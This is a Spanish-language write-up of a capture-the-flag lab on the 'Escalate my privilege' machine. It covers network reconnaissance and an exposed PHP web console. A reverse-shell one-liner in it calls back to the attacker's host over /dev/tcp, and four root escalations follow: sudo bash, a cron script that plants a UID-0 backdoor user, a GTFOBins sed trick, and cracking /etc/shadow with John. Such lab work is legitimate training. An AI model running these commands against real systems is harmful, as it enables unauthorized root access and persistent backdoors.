# Escalate my privilege

Exploración y Explotación de Vulnerabilidades de Escalada de Privilegios

## Objetivos

El objetivo principal es realizar la escalada de privilegios con al menos 2 tecnicas diferentes.

## Maquina objetivo

Para la realizacion de este ejercicio se usa la maquina:

![alt text](/images/image-0.png)

## Resolucion

Usaré una distribucion Kali OS como maquina atacante.

![alt text](/images/image.png)

Comprobacion de interfaces en la maquina Kali:

```bash
ip address show
```

![alt text](/images/image-1.png)

Y mi IP en la red de la maquina objetivo es:

```bash
10.0.2.14
```

### Descubrimiento de maquinas en la red

Para el escaneo de red para descubrir las maquinas utilizo la herramienta **netdiscover**

```bash
netdiscover -i eth0 -r 10.0.2.0/24
```

![alt text](/images/image-3.png)

Descubro una IP **10.0.2.16**

A continuacion me interesa conocer lo mas posible de la maquina objetivo, para ello realizo un escaneo basico de la maquina

nmap 10.0.2.16

![alt text](/images/image-4.png)

Obtengo los siguientes resultados

PORT     | STATE | SERVICE | VERSION
---------|-------|---------|-----------------------------------------
22/tcp   | open  | ssh     | OpenSSH 7.4 (protocol 2.0)
80/tcp   | open  | http    | Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
111/tcp  | open  | rpcbind | 2-4 (RPC #100000)
2049/tcp | open  | nfs_acl | 3 (RPC #100227)

He descubierto que la maquina tiene 2 servicios principales que podria pensar en explotar para acceder y luego poder hacer escalada de privilegios:

- Puerto 22 con servicio SSH abierto que tiene un openSSH version 7.4 con protocolo 2.0 (protocolo seguro)
- Puerto 80 con servicio http ejecutando un Apache httpd 2.4.6

Ya que he descubierto que tiene activo un servidor http sobre el puerto 80 uso la herramienta nikto para comprobar los archivos y directorios.

![alt text](/images/image-5.png)

Obtengo como resultados importantes las siguientes lineas

- Server: Apache/2.4.6 (CentOS) PHP/5.4.16
- The anti-clickjacking X-Frame-Options header is not present.
- /phpbash.php: Retrieved x-powered-by header: PHP/5.4.16.
- /robots.txt: Entry '/phpbash.php' is returned a non-forbidden or redirect HTTP code (200).
- Apache/2.4.6 appears to be outdated.
- PHP/5.4.16 appears to be outdated
- OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE .
- /phpinfo.php: Output from the phpinfo() function was found.
- /readme.txt: This might be interesting.
- /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
- /icons/: Directory indexing found.
- /icons/README: Apache default file found.

Explotacion obteniendo una shell en la maquina objetivo.

Intento realizar un acceso al servidor web que aloja la maquina objetivo y nos muestra la siguiente pagina:

![alt text](/images/image-6.png)

Cuando hice el escaneo con nikto aparecio que tenia disponible el fichero robots.txt y que ademas contenia la entrada /phpbash.php.

![alt text](/images/image-7.png)

Accedo a ese fichero del servidor a traves del navegador y obtengo:

![alt text](/images/image-8.png)

Lo que parece una consola en la maquina a traves de un fichero php.

Ejecuto diferentes comandos para comprobar su funcionamiento y ademas comprobar con que usuario trabajo en esta consola

![alt text](/images/image-9.png)

### Obtencion de la shell

Lanzo nc -nlvp 1234 para quedarme a la escucha en el puerto 1234 en la red de la maquina objetivo.

![alt text](/images/image-11.png)

En la maquina objetivo lanzo el comando:

```bash
bash -i >& /dev/tcp/10.0.2.14/1234 0>&1
```

![alt text](/images/image-10.png)

Y de nuevo en la maquina atacante veo como he conseguido una shell

![alt text](/images/image-12.png)

Para obtener una shell con mas funcionalidades realizo el siguiente proceso:

```bash
script /dev/null -c bash
```

Pulso ```CTRL + Z``` para dejar la zsh suspendida

![alt text](/images/image-16.png)

A continuacion:

```bash
stty raw -echo; fg
reset xterm
```

![alt text](/images/image-17.png)

```bash
export TERM=xterm
export SHELL=bash
```

![alt text](/images/image-18.png)

### Pivoting de usuario apache -> ucjc

Compruebo en el shell obtenido de la maquina objetivo el contenido.

Veo que hay un fichero llamado readme.txt

![alt text](/images/image-19.png)

Si compruebo su contenido me da una pista para poder avanzar en el reto.

>HI
>
>Find Armour User backup in /backup
>En español:
>
>HOLA Buscar la copia de seguridad de lo usuario Armour en /backup

Las carpetas de los usuarios se crean bajo el directorio /home por lo que compruebo lo que hay en ese directorio con el comando

```bash
ls -la /home
```

Obtengo que el usuario ucjc tiene carpetas en /home y compruebo que contiene la carpeta del usuario.

![alt text](/images/image-22.png)

Encuentro un fichero llamado **Credentials.txt**

Compruebo su contenido:

![alt text](/images/image-23.png)

Obtengo el md5 tal y como se indica de **rootroot1** con el comando:

```bash
echo -n rootroot1 | md5sum
```

![alt text](/images/image-24.png)

Intento logarme con el usuario ucjc haciendo ```su ucjc``` y como clave el hash md5 que he obtenido en el paso anterior.

![alt text](/images/image-25.png)

Ahora ya tengo el usuario ucjc

### Privilege Escalation Nº 1: SUDO-L

Compruebo con sudo -l cuales son los comandos que puedo ejecutar con permisos de root desde el usuario ucjc

![alt text](/images/image-27.png)

Como se ve en la /images/imagen se puede ejecutar sin clave una gran cantidad de comandos, por ejemplo nano, chmod, mv, ln, chown, etc...

Pero una de las mas llamativas es que nos permita ejecutar bash con sudo ya que esto nos daria directamente el acceso como root en la terminal.

Lanzo el comando:

```bash
sudo /bin/bash
```

y compruebo que he obtenido el uid 0, gid 0 y groups 0, es decir, root completo.

![alt text](/images/image-28.png)

### Privilege Escalation Nº 2: CRONTAB

En la carpeta del usuario ucjc existe un fichero llamado backup.sh con permisos de lectura escritura y ejecucion para todos el cual indica en su interior que le hagamos un backup.

Para realizar el backup voy a ver si se esta realizando ya en el crontab.

![alt text](/images/image-32.png)

Ya que el crontab se ejecuta con permisos de administrador, voy a crear dentro un script que añada un usuario y ademas le establezca el usuario en UID 0, que seria root y le establecere una clave que voy a generar con el siguiente comando:

```bash
openssl passwd -6 -salt DhhlabhR 12345678
```

![alt text](/images/image-37.png)

Este comando de OpenSSL se utiliza para generar contraseñas hash en diferentes formatos. El modificador -6: Este indica que se debe utilizar el formato de cifrado de contraseña SHA512crypt. Con el modificador -salt 1 especifico el valor del "salt" (sal) a utilizar como entrada adicional para aumentar la seguridad del hash de la contraseña. En este caso, el valor de la sal es "1". La clave a encriptar sera "12345678"

La clave que me devuelve es:

```bash
$6$DhhlabhR$QtL1Lye8xLphXmzhbGvO1gRb7H7HmgrJUxjJjEwHKSwZwX9zTIj1kW9bwelCdXBh20euFNL2Yy7UHWle9wQ9M1
```

Asi que creo el siguiente script en el fichero backup.sh

```bash
#!/bin/bash
/usr/sbin/useradd ibl4zqu3z -u 0 -o -p $6$DhhlabhR$QtL1Lye8xLphXmzhbGvO1gRb7H7HmgrJUxjJjEwHKSwZwX9zTIj1kW9bwelCdXBh20euFNL2Yy7UHWle9wQ9M1
```

![alt text](/images/image-36.png)

Si compruebo el contenido de passwd veo que siendo usuario sin permisos de modificar passwd he conseguido añadir dentro del fichero mi usuario.

![alt text](/images/image-34.png)

y ademas he añadido en el fichero /etc/shadow la clave que generé para el nuevo usuario.

![alt text](/images/image-38.png)

El siguiente paso es probar si puedo usar el usuario recien creado.

![alt text](/images/image-39.png)

### Privilege Escalation Nº3: GTFOBins

Para realizar una escalada de privilegios desde el usuario ucjc tengo que ver cuales son los binarios que permiten ejecutarse con permisos de otro usuario.

Realizo la busqueda con el suiguiente comando:

```bash
find / -perm -u=s -type f 2>/dev/null
```

![alt text](/images/image-40.png)

En la pagina del proyecto GTFOBins podemos hacer un filtro de aquellos que tienen permisos de **sudo** y que tienen la flag de **suid**

![alt text](/images/image-42.png)

Buscamos en la lista de GTFOBins los binarios que tengo en el sistema victima y elegimos por ejemplo el comando **sed**

![alt text](/images/image-43.png)

En la web nos indica como obtener el sudo desde el comando sed con una sola sentencia.

```bash
sudo sed -n '1e exec sh 1>&0' /etc/hosts
```

Lo ejecutamos en la maquina objetivo

![alt text](/images/image-44.png)

Y como podemos ver se ha obtenido root.

### Privilege Escalation Nº4: Fuerza bruta

Desde el usuario ucjc puedo comprobar el contenido de los ficheros /etc/passwd y /etc/shadow.

Extraemos su contenido a la maquina atacante en dos ficheros que voy a llamar **password** y **sombra**

Mediante el comando unshadow combino el archivo password con el archivo Sombra y luego guardar la salida combinada en un archivo llamado password.txt

```bash
unshadow passwords Sombra > password.txt
```

A continuacion realizo un ataque de fuerza bruta con John The Ripper para intentar obtener la clave de usuario root usando uno de los diccionarios mas famosos que ademas viene incluido en la maquina atacante Kali.

Con el siguiente comando lanzo el ataque

```bash
john --wordlist=/home/kali/Documents/Dictionaries/rockyou.txt password.txt
```

Cuando el ataque termina obtengo el siguiente resultado:

![alt text](/images/image-48.png)

Como se ve en la /images/imagen he obtenido la clave tanto para el usuario root como la clave para el usuario que añadí en la escalada de privilegios con crontab.

Compruebo que puedo cambiar a root con la clave obtenida.

![alt text](/images/image-49.png)

Y se confirma que he obtenido la clave root y por tanto la elevacion de privilegios.
